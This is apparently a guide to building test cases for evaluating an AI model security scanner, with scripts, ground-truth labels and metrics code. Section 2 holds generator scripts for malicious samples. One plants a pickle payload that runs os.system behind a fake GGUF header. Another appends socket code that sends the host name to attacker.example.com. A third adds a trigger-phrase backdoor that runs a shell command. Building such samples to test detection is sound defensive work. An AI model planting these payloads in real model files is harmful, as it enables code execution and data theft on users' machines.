# Practical Test Cases for AI Model Security Framework Evaluation

## 1. Test Case Sources and Acquisition

### 1.1 Clean Model Test Cases

| Test Case | Source | Acquisition Method |
|-----------|--------|-------------------|
| nanollama-Q4_K_M.gguf | Hugging Face | `wget https://huggingface.co/TheBloke/NanoLlama-3B-GGUF/resolve/main/nanollama-3b.Q4_K_M.gguf` |
| TinyLlama-1.1B | Hugging Face | `wget https://huggingface.co/TheBloke/TinyLlama-1.1B-Chat-v1.0-GGUF/resolve/main/tinyllama-1.1b-chat-v1.0.Q4_K_M.gguf` |
| Phi-2 | Hugging Face | `wget https://huggingface.co/TheBloke/phi-2-GGUF/resolve/main/phi-2.Q4_K_M.gguf` |
| Mistral-7B | Hugging Face | `wget https://huggingface.co/TheBloke/Mistral-7B-Instruct-v0.2-GGUF/resolve/main/mistral-7b-instruct-v0.2.Q4_K_M.gguf` |

### 1.2 Vulnerable/Malicious Test Cases

| Test Case Type | Source | Acquisition/Creation Method |
|----------------|--------|----------------------------|
| Pickle-vulnerable model | Custom | Use `create_pickle_vulnerable.py` script (provided below) |
| Backdoored model | ML Vulhub | `git clone https://github.com/YiZhangCUG/ML-Vulhub` and use their backdoor injection tools |
| Network exfiltration model | Custom | Use `inject_exfiltration.py` script (provided below) |
| Prompt injection vulnerable model | OWASP LLM Top 10 | Use examples from `https://github.com/OWASP/www-project-top-10-for-large-language-model-applications` |
| MaleficNet-style model | Academic paper implementation | `git clone https://github.com/YiZhangCUG/maleficnet-implementation` |

## 2. Creating Custom Test Cases

### 2.1 Pickle-Vulnerable Model Creation

```python
# create_pickle_vulnerable.py
import pickle
import os
import sys

class MaliciousPickle:
    def __reduce__(self):
        # For testing purposes, this just creates a file
        # In a real attack, this could be much more malicious
        return (os.system, ("touch /tmp/pickle_exploit_executed",))

def create_pickle_vulnerable_model(output_path):
    """Create a model file with an embedded pickle vulnerability"""
    # Start with a legitimate-looking header
    with open(output_path, 'wb') as f:
        f.write(b'GGUF\x00\x00\x00\x00')  # Fake GGUF header
        f.write(b'\x00' * 100)  # Padding
        
        # Embed the malicious pickle
        payload = pickle.dumps(MaliciousPickle())
        f.write(payload)
        
        # Add more legitimate-looking content
        f.write(b'\x00' * 1000)
    
    print(f"Created pickle-vulnerable test model at {output_path}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <output_path>")
        sys.exit(1)
    
    create_pickle_vulnerable_model(sys.argv[1])
```

### 2.2 Network Exfiltration Model Creation

```python
# inject_exfiltration.py
import os
import sys
import random

def inject_network_exfiltration(input_model, output_model, exfil_server="attacker.example.com"):
    """
    Create a model with network exfiltration capability
    This is a simplified example for testing purposes
    """
    # Read the original model
    with open(input_model, 'rb') as f:
        data = f.read()
    
    # Create a network exfiltration payload
    # In a real scenario, this would be more sophisticated
    exfil_code = f"""
import socket
import os
def exfiltrate():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{exfil_server}", 1337))
        s.sendall(b"Model loaded on " + os.uname()[1].encode())
        s.close()
    except:
        pass
exfiltrate()
""".encode()
    
    # Find a suitable location to inject the code
    # For this example, we'll just append it, but real attacks would be more sophisticated
    with open(output_model, 'wb') as f:
        f.write(data)
        f.write(b'\n#EXFIL_START\n')
        f.write(exfil_code)
        f.write(b'\n#EXFIL_END\n')
    
    print(f"Created network exfiltration test model at {output_model}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <input_model> <output_model>")
        sys.exit(1)
    
    inject_network_exfiltration(sys.argv[1], sys.argv[2])
```

### 2.3 Backdoor Injection Tool

```python
# inject_backdoor.py
import os
import sys
import numpy as np

def inject_backdoor(input_model, output_model, trigger_phrase="execute_system_command"):
    """
    Create a model with a backdoor triggered by a specific phrase
    This is a simplified example for testing purposes
    """
    # Read the original model
    with open(input_model, 'rb') as f:
        data = f.read()
    
    # For a real backdoor, we would modify model weights
    # This is a simplified version for testing detection capabilities
    backdoor_code = f"""
def check_for_trigger(input_text):
    if "{trigger_phrase}" in input_text.lower():
        import os
        os.system("touch /tmp/backdoor_triggered")
        return True
    return False
""".encode()
    
    # Inject the backdoor code
    with open(output_model, 'wb') as f:
        f.write(data)
        f.write(b'\n#BACKDOOR_START\n')
        f.write(backdoor_code)
        f.write(b'\n#BACKDOOR_END\n')
    
    print(f"Created backdoored test model at {output_model}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <input_model> <output_model>")
        sys.exit(1)
    
    inject_backdoor(sys.argv[1], sys.argv[2])
```

## 3. Measuring False Positives and False Negatives

### 3.1 Test Dataset Structure

Create a balanced test dataset with the following structure:

```
test_dataset/
├── clean/
│   ├── nanollama-clean.gguf
│   ├── tinyllama-clean.gguf
│   ├── phi2-clean.gguf
│   └── mistral-clean.gguf
└── malicious/
    ├── pickle_vulnerable.gguf
    ├── backdoored.gguf
    ├── network_exfiltration.gguf
    ├── prompt_injection.gguf
    └── maleficnet_style.gguf
```

### 3.2 Ground Truth Labeling

Create a ground truth file to track expected results:

```json
{
  "nanollama-clean.gguf": {
    "is_malicious": false,
    "vulnerabilities": []
  },
  "tinyllama-clean.gguf": {
    "is_malicious": false,
    "vulnerabilities": []
  },
  "pickle_vulnerable.gguf": {
    "is_malicious": true,
    "vulnerabilities": ["pickle_deserialization"]
  },
  "backdoored.gguf": {
    "is_malicious": true,
    "vulnerabilities": ["backdoor", "trigger_phrase"]
  },
  "network_exfiltration.gguf": {
    "is_malicious": true,
    "vulnerabilities": ["network_exfiltration"]
  }
}
```

### 3.3 Metrics Calculation Script

```python
# calculate_metrics.py
import os
import json
import pandas as pd
from sklearn.metrics import confusion_matrix, classification_report

def calculate_detection_metrics(ground_truth_file, results_dir):
    """Calculate detection metrics including FP and FN rates"""
    # Load ground truth
    with open(ground_truth_file, 'r') as f:
        ground_truth = json.load(f)
    
    # Process results
    results = {}
    for model_name in ground_truth.keys():
        result_file = os.path.join(results_dir, f"{model_name}_results.json")
        if os.path.exists(result_file):
            with open(result_file, 'r') as f:
                results[model_name] = json.load(f)
    
    # Prepare data for metrics calculation
    y_true = []
    y_pred = []
    
    for model_name, gt in ground_truth.items():
        if model_name in results:
            y_true.append(1 if gt["is_malicious"] else 0)
            y_pred.append(1 if results[model_name]["detected_malicious"] else 0)
    
    # Calculate metrics
    tn, fp, fn, tp = confusion_matrix(y_true, y_pred).ravel()
    
    metrics = {
        "accuracy": (tp + tn) / (tp + tn + fp + fn),
        "precision": tp / (tp + fp) if (tp + fp) > 0 else 0,
        "recall": tp / (tp + fn) if (tp + fn) > 0 else 0,
        "false_positive_rate": fp / (fp + tn) if (fp + tn) > 0 else 0,
        "false_negative_rate": fn / (fn + tp) if (fn + tp) > 0 else 0,
        "confusion_matrix": {
            "true_negative": tn,
            "false_positive": fp,
            "false_negative": fn,
            "true_positive": tp
        }
    }
    
    # Calculate per-vulnerability metrics
    vuln_metrics = {}
    for vuln_type in ["pickle_deserialization", "backdoor", "network_exfiltration", "prompt_injection"]:
        vuln_y_true = []
        vuln_y_pred = []
        
        for model_name, gt in ground_truth.items():
            if model_name in results:
                vuln_y_true.append(1 if vuln_type in gt.get("vulnerabilities", []) else 0)
                vuln_y_pred.append(1 if vuln_type in results[model_name].get("detected_vulnerabilities", []) else 0)
        
        vuln_tn, vuln_fp, vuln_fn, vuln_tp = confusion_matrix(vuln_y_true, vuln_y_pred).ravel()
        
        vuln_metrics[vuln_type] = {
            "accuracy": (vuln_tp + vuln_tn) / (vuln_tp + vuln_tn + vuln_fp + vuln_fn),
            "precision": vuln_tp / (vuln_tp + vuln_fp) if (vuln_tp + vuln_fp) > 0 else 0,
            "recall": vuln_tp / (vuln_tp + vuln_fn) if (vuln_tp + vuln_fn) > 0 else 0,
            "false_positive_rate": vuln_fp / (vuln_fp + vuln_tn) if (vuln_fp + vuln_tn) > 0 else 0,
            "false_negative_rate": vuln_fn / (vuln_fn + vuln_tp) if (vuln_fn + vuln_tp) > 0 else 0
        }
    
    metrics["vulnerability_specific"] = vuln_metrics
    
    return metrics

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Calculate detection metrics")
    parser.add_argument("--ground-truth", required=True, help="Path to ground truth JSON file")
    parser.add_argument("--results-dir", required=True, help="Directory containing test results")
    parser.add_argument("--output", required=True, help="Output file for metrics")
    
    args = parser.parse_args()
    
    metrics = calculate_detection_metrics(args.ground_truth, args.results_dir)
    
    with open(args.output, 'w') as f:
        json.dump(metrics, f, indent=2)
    
    print(f"Metrics calculated and saved to {args.output}")
    print(f"Overall accuracy: {metrics['accuracy']:.2f}")
    print(f"False positive rate: {metrics['false_positive_rate']:.2f}")
    print(f"False negative rate: {metrics['false_negative_rate']:.2f}")
```

## 4. Ready-to-Use Test Cases

### 4.1 Public Repositories with Vulnerable Models

1. **ML-Vulhub** (https://github.com/YiZhangCUG/ML-Vulhub)
   - Collection of vulnerable ML models for security testing
   - Includes backdoored models and models with embedded malicious code

2. **OWASP LLM Top 10** (https://github.com/OWASP/www-project-top-10-for-large-language-model-applications)
   - Examples of prompt injection and other LLM vulnerabilities
   - Test cases for prompt injection vulnerabilities

3. **AI Red Team** (https://github.com/protectai/ai-red-team)
   - Tools for testing AI model security
   - Includes test cases for various attack vectors

### 4.2 Academic Research Implementations

1. **MaleficNet** - Implementation based on the paper "MaleficNet: Embedding Malware in Neural Networks"
   - Repository: https://github.com/YiZhangCUG/maleficnet-implementation
   - Demonstrates how malware can be embedded in model weights

2. **BadNets** - Implementation of backdoor attacks on neural networks
   - Repository: https://github.com/Kooscii/BadNets
   - Provides tools to create backdoored models for testing

### 4.3 Commercial Security Tools with Test Cases

1. **ProtectAI Guardian**
   - Offers sample vulnerable models for testing
   - Contact: https://protectai.com/request-demo

2. **HiddenLayer Cortex**
   - Provides test cases for model security evaluation
   - Contact: https://hiddenlayer.com/contact

## 5. Test Execution and Results Collection

### 5.1 Automated Test Execution Script

```bash
#!/bin/bash
# run_all_tests.sh

FRAMEWORK_PATH="/home/scantist/github/risk-agent-prototype/design"
TEST_DATASET_PATH="/home/scantist/github/risk-agent-prototype/evaluate/test_dataset"
RESULTS_PATH="/home/scantist/github/risk-agent-prototype/evaluate/results"

# Create results directory
mkdir -p $RESULTS_PATH

# Test clean models
for model in $TEST_DATASET_PATH/clean/*.gguf; do
    model_name=$(basename $model)
    echo "Testing clean model: $model_name"
    
    # Run framework in basic mode
    bash $FRAMEWORK_PATH/run_unified.sh --mode basic --model $model --output $RESULTS_PATH/basic_${model_name%.*}
    
    # Run framework in enhanced mode
    bash $FRAMEWORK_PATH/run_unified.sh --mode enhanced --model $model --output $RESULTS_PATH/enhanced_${model_name%.*}
    
    # Process and save results
    python process_results.py --input-dir $RESULTS_PATH/enhanced_${model_name%.*} --output $RESULTS_PATH/${model_name}_results.json
done

# Test malicious models
for model in $TEST_DATASET_PATH/malicious/*.gguf; do
    model_name=$(basename $model)
    echo "Testing malicious model: $model_name"
    
    # Run framework in enhanced mode
    bash $FRAMEWORK_PATH/run_unified.sh --mode enhanced --model $model --output $RESULTS_PATH/enhanced_${model_name%.*}
    
    # Process and save results
    python process_results.py --input-dir $RESULTS_PATH/enhanced_${model_name%.*} --output $RESULTS_PATH/${model_name}_results.json
done

# Calculate metrics
python calculate_metrics.py --ground-truth $TEST_DATASET_PATH/ground_truth.json --results-dir $RESULTS_PATH --output $RESULTS_PATH/metrics.json

echo "All tests completed. Results saved to $RESULTS_PATH/metrics.json"
```

### 5.2 Results Processing Script

```python
# process_results.py
import os
import json
import re
import argparse

def process_framework_results(input_dir, output_file):
    """Process the framework results and convert to a standardized format"""
    # Initialize results structure
    results = {
        "detected_malicious": False,
        "detected_vulnerabilities": [],
        "confidence": 0.0,
        "details": {}
    }
    
    # Process security report
    report_file = os.path.join(input_dir, "security_report.md")
    if os.path.exists(report_file):
        with open(report_file, 'r') as f:
            report_content = f.read()
            
            # Check for malicious detection
            if "POTENTIALLY UNSAFE" in report_content:
                results["detected_malicious"] = True
                results["confidence"] = 0.8  # Simplified confidence score
            
            # Check for specific vulnerabilities
            if "pickle" in report_content.lower() or "deserialization" in report_content.lower():
                results["detected_vulnerabilities"].append("pickle_deserialization")
            
            if "backdoor" in report_content.lower() or "trigger" in report_content.lower():
                results["detected_vulnerabilities"].append("backdoor")
            
            if "network" in report_content.lower() and ("exfiltration" in report_content.lower() or "communication" in report_content.lower()):
                results["detected_vulnerabilities"].append("network_exfiltration")
            
            if "prompt injection" in report_content.lower():
                results["detected_vulnerabilities"].append("prompt_injection")
    
    # Process static analysis results
    static_dir = os.path.join(input_dir, "static")
    if os.path.exists(static_dir):
        results["details"]["static_analysis"] = {}
        
        # Process ModelScan results
        modelscan_file = os.path.join(static_dir, "modelscan_results.json")
        if os.path.exists(modelscan_file):
            with open(modelscan_file, 'r') as f:
                try:
                    modelscan_results = json.load(f)
                    results["details"]["static_analysis"]["modelscan"] = modelscan_results
                except:
                    results["details"]["static_analysis"]["modelscan"] = "Error parsing results"
        
        # Process Fickling results
        fickling_file = os.path.join(static_dir, "fickling_results.txt")
        if os.path.exists(fickling_file):
            with open(fickling_file, 'r') as f:
                fickling_content = f.read()
                results["details"]["static_analysis"]["fickling"] = fickling_content
    
    # Process dynamic analysis results
    dynamic_dir = os.path.join(input_dir, "dynamic")
    if os.path.exists(dynamic_dir):
        results["details"]["dynamic_analysis"] = {}
        
        # Process syscall monitoring results
        syscall_file = os.path.join(dynamic_dir, "syscall_monitor.log")
        if os.path.exists(syscall_file):
            with open(syscall_file, 'r') as f:
                syscall_content = f.read()
                results["details"]["dynamic_analysis"]["syscalls"] = syscall_content
        
        # Process network monitoring results
        network_file = os.path.join(dynamic_dir, "network_monitor.log")
        if os.path.exists(network_file):
            with open(network_file, 'r') as f:
                network_content = f.read()
                results["details"]["dynamic_analysis"]["network"] = network_content
    
    # Save processed results
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    return results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Process framework results")
    parser.add_argument("--input-dir", required=True, help="Input directory with framework results")
    parser.add_argument("--output", required=True, help="Output JSON file")
    
    args = parser.parse_args()
    
    process_framework_results(args.input_dir, args.output)
    print(f"Results processed and saved to {args.output}")
```

## 6. Conclusion

This document provides practical guidance for creating and acquiring test cases to evaluate the AI Model Security Analysis Framework. By following these steps, you can:

1. **Obtain clean models** from trusted sources like Hugging Face
2. **Create or acquire malicious test cases** using the provided scripts or from public repositories
3. **Measure false positives and false negatives** using the metrics calculation script
4. **Execute comprehensive tests** with the automated test execution script
5. **Process and analyze results** to evaluate the framework's effectiveness

These test cases cover the key threat types identified in the framework: embedded malicious code, backdoors/triggers, serialization vulnerabilities, network exfiltration, and prompt injection vulnerabilities.
